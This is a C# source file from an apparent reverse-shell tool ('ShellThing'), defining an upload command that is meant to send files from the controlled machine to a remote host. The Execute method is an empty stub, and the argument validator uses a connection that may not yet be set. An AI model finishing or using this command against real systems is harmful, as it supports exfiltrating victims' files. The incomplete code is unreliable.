using System;
using System.Net;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    /// <summary>
    /// Send a file to the remote host via HTTP (System.Net.WebClient).
    /// </summary>
    class UploadCommand : ICommand
    {
        private Uri uri;
        private string uploadPath;

        TcpReverseConnection connection;

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;

        }

        public bool ValidateArguments(string[] commandArguments)
        {
            if (commandArguments.Length == 3)
            {
                // Test whether the first argument is a valid absolute URI
                if (Uri.TryCreate(commandArguments[1], UriKind.Absolute, out uri))
                {
                    // Rough test for valid file path
                    try
                    {
                        uploadPath = Path.GetFullPath(commandArguments[2]);
                    }
                    catch (Exception)
                    {
                        connection.SendData("UploadCommand - Error: invalid file path");
                        return false;
                    }

                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
}
